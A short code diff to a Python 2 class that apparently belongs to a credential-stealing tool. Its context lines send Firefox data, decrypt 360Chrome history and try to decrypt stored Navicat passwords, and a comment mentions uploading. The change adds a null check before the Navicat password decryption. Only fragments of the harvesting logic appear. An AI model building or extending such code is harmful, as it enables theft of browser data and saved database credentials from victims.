@@ -113,14 +113,16 @@ class Software:
             output.send_firefox_data()
         else:
             pass
-        print '[*] Finding histroy in 360Chrome'
         self.get_360c_history()
         output.get_decypt_360chrome()
 
         try:
             if re.findall('Navicat+', Installation, re.S):
                 print "[*] Attempting to decrypt Navicat"
-                self._server.navicatpwd()
+                if self._server == 0:
+                    pass
+                else:
+                    self._server.navicatpwd()
         except Exception:
             pass
         # print_warning("Please wait while uploading ... ")
